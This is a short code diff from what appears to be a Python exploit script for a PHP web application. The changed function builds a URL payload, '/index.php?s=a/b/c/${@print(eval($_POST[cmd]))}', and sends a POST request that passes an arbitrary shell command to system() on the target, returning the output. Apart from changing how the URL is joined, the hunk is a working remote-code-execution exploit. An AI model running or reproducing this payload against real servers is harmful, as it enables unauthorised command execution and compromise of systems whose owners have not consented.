@@ -13,7 +13,7 @@ from urllib.parse import urljoin
 def run(url, cmd):
     try:
         payload = r'/index.php?s=a/b/c/${@print(eval($_POST[cmd]))}'
-        payload = urllib.parse.urljoin(url, payload)
+        payload = url + payload
         response = requests.post(payload, data={"cmd": "echo '{{{{{';system('" + str(cmd) + "');echo '}}}}}';"})
         if response.status_code == 200:
             return True, response.text
